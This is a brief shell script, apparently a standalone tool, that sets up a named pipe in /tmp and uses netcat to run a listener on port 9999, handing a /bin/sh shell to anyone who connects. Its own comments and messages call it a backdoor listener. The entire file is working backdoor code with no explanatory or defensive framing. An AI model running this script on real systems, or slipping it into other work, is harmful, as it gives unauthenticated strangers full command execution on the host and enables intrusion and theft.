#!/bin/sh

PIPE="/tmp/backpipe"

# Clean up any existing pipe
rm -f "$PIPE"

# Create a named pipe
mkfifo "$PIPE"

# Start the backdoor listener using /bin/nc
echo "Starting backdoor listener on port 9999..."
(cat "$PIPE" | /bin/sh 2>&1 | /bin/nc -l 9999 > "$PIPE") &

echo "Backdoor listener started."
